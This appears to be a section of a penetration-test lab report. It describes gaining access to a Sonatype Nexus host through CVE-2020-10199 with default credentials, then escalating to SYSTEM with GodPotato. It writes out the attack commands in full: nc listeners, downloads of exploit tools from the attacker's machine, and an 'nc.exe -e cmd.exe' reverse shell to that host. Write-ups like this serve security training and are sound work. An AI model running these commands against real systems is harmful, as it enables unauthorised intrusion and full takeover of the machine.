
## 4.1 **Target #1 - 192.168.197.61**

### **4.1.1 Service Enumeration**

**Port Scan Results:**

| |
| --- | ---|
|**Server IP Address**|**Ports Open**|
|192.168.197.61|**TCP:** 21, 80, 445, 8081|
|| **UDP:** None|  

### 4.1.2 Initial Access -  CVE-2020-10199 (Sonatype Nexus 3.21.1 - Remote Code Execution Authenticated)

**Vulnerability Explanation:** Nexus Repository Manager 3 versions 3.21.1 and below are vulnerable to Java EL injection which allows a low privilege user to remotely execute code on the target server.

**Vulnerability Fix:** Update a newer version that is patched. 

**Severity:** **Critical**

**Steps to reproduce the attack:**

1. I was trying different default/common credentials to log into the Nexus Repository Manager service and found that `nexus:nexus` were valid credentials.
2. Once I had valid credentials, I modified the exploit from https://www.exploit-db.com/exploits/49385 to include the target, the credentials and the payload.
3. For the payload, I created an encoded PowerShell one-liner reverse shell using the following commands:
![[Pasted image 20231102224755.png]]
4. Next, I added the base64 payload into the POC exploit as follows.
5. I started a nc listener by running `rlwrap nc -lvnp 5555`.
**Proof of Concept Code:** modifications to the existing exploit are highlighted in red.
> https://www.exploit-db.com/exploits/49385

![[Pasted image 20231102224950.png]]
### 4.1.3 Privilege Escalation - SeImpersonatePrivilege

**Vulnerability Explanation:** Users with SeImpersonatePrivilege privilege can impersonate any process they can get a handle on. There are a lot of public exploits that will leverage this to achieve privilege escalation and run commands as SYSTEM. 

**Vulnerability Fix**: Do not grant SeImpersonatePrivilege to users that don't need it. 

**Severity:** **Critical**

**Steps to reproduce the attack:** I uploaded the exploit GodPotato to the machine and a windows versions of nc64.exe. Then I started a nc listener in kali and ran godPotato to exploit the vuln and get execution as SYSTEM.

1. Download godpotato into the system: `iwr -uri 192.168.45.229/`
2. Download nc.exe into the system: `iwr -uri 192.168.45.229/GodPotato-NET4.exe -outfile GodPotato-NET4.exe`
3. Start a nc listener in kali `rlwrap nc -lvnp 9999`
4. Run the exploit and specify the command we want to run as SYSTEM. In this case, a reverse shell using nc.exe: `./GodPotato-NET4.exe -cmd "cmd /c C:\Users\nathan\nc.exe -e cmd.exe 192.168.45.229 9999 "`
![[Pasted image 20231102230115.png]]
### 4.1.4 Post-Exploitation
**System Proof Screenshot:**
![[Pasted image 20231102223043.png]]

